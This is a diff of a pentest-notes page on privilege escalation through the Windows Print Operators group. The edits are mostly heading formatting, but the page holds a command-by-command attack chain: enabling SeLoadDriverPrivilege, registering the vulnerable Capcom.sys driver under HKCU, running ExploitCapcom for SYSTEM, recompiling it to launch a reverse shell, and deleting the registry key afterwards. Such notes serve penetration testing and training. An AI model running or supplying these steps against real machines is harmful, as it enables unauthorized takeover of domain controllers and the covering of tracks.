@@ -1,6 +1,6 @@
 # Print Operators
 
-## <mark style="color:yellow;">About</mark>
+## <mark style="color:yellow;">ABOUT</mark>
 
 <mark style="color:red;">**Print Operators**</mark> is another highly privileged group, which grants its members the <mark style="color:green;">`SeLoadDriverPrivilege`</mark>, rights to <mark style="color:purple;">**manage, create, share, and delete printers**</mark> connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.
 
@@ -10,19 +10,19 @@ The plan is to use <mark style="color:green;">**EnableSeLoadDriverPrivilege**</m
 
 <mark style="color:orange;">**OR**</mark> we can change code of <mark style="color:green;">**ExploitCapcom**</mark> to make a reverse shell for us (if we have no GUI access).
 
-### <mark style="color:blue;">Check privs</mark>
+#### Check privs
 
 ```powershell
 C:\> whoami /priv
 ```
 
-### <mark style="color:blue;">EnableSeLoadPrivilege</mark>
+#### EnableSeLoadPrivilege
 
 ```powershell
 C:\> .\EnableSeLoadDriverPrivilege.exe
 ```
 
-### <mark style="color:blue;">Add Reference to Driver</mark>
+#### Add Reference to Driver
 
 You need to download Capcom.sys to <mark style="color:green;">`C:\temp`</mark>. Issue the commands below to add a reference to this driver under our <mark style="color:blue;">**HKEY\_CURRENT\_USER**</mark> tree.
 
@@ -32,7 +32,7 @@ C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??
 C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 ```
 
-### <mark style="color:blue;">Verify Driver</mark>
+#### Verify Driver
 
 ```powershell
 PS C:\> .\DriverView.exe /stext drivers.txt
@@ -40,7 +40,7 @@ PS C:\> .\DriverView.exe /stext drivers.txt
 PS C:\> cat drivers.txt | Select-String -pattern Capcom
 ```
 
-### <mark style="color:blue;">Exploiting</mark>
+#### Exploiting
 
 ```powershell
 PS C:\> .\ExploitCapcom.exe
@@ -48,7 +48,7 @@ PS C:\> .\ExploitCapcom.exe
 
 ***
 
-### <mark style="color:blue;">Same stuff but automated</mark>
+#### Same stuff but automated
 
 We can use <mark style="color:green;">**EoPLoadDriver**</mark> [**\[LINK\]**](https://github.com/TarlogicSecurity/EoPLoadDriver/) script to automate process of enabling the privilege, creating the registry key, and executing <mark style="color:green;">`NTLoadDriver`</mark> to load the driver by using this command.
 
@@ -62,7 +62,7 @@ PS C:\> .\ExploitCapcom.exe
 
 ***
 
-### <mark style="color:blue;">NO GUI</mark>
+### NO GUI
 
 For that we need to find ExploitCapcom.cpp. change string below and recompile.
 
@@ -74,7 +74,7 @@ A F T E R : TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
 
 ***
 
-### <mark style="color:blue;">Cleanup</mark>
+### Cleanup
 
 For a little clean up we could just delete registry key we made before.
 
